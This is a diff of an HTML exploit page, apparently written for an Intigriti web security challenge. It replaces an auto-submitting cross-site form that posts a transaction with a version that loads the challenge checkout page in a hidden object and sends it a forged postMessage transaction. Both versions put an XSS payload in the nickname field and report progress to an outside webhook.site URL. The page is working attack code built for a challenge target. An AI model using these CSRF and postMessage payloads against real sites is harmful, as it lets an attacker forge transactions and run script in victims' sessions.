@@ -1,21 +1,28 @@
 <!DOCTYPE html>
-<html><head><title>Form Exploit</title></head>
+<html><head><title>Object Exploit</title></head>
 <body>
-<h2>Submitting transaction...</h2>
-<form id="f" method="POST" action="https://challenge-0126.intigriti.io/api/transaction">
-    <input name="toAddress" value="16472226db03703a192aa383237035a69f">
-    <input name="currency" value="1337COIN">
-    <input name="amount" value="1">
-    <input name="nickname" value="<img src=x onerror='alert(&quot;gigawatz&quot;)'>">
-</form>
+<h2>Exploit</h2>
+<pre id=log></pre>
+<object id="x" data="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1" style="display:none"></object>
 <script>
 const WEBHOOK = 'https://webhook.site/8b2e60bf-f559-4793-afac-5a501921e9b4';
-fetch(WEBHOOK + '?s=FORM_SUBMIT').catch(()=>{});
+const WALLET = '16472226db03703a192aa383237035a69f';
+const log = document.getElementById('log');
 
-// Auto-submit form
-setTimeout(function() {
-    document.getElementById('f').submit();
-}, 500);
+function report(s) { log.textContent += '\n' + s; fetch(WEBHOOK + '?s=' + s).catch(()=>{}); }
+
+report('1_LOADED');
+
+document.getElementById('x').onload = function() {
+    report('2_OBJECT_LOADED');
+    setTimeout(function() {
+        document.getElementById('x').contentWindow.postMessage({
+            type: 'submitTransaction',
+            transaction: {toAddress: WALLET, currency: '1337COIN', amount: 1, nickname: '<img src=x onerror="alert(\'gigawatz\')">'}
+        }, '*');
+        report('3_POSTMESSAGE_SENT');
+    }, 2000);
+};
 </script>
 </body>
 </html>
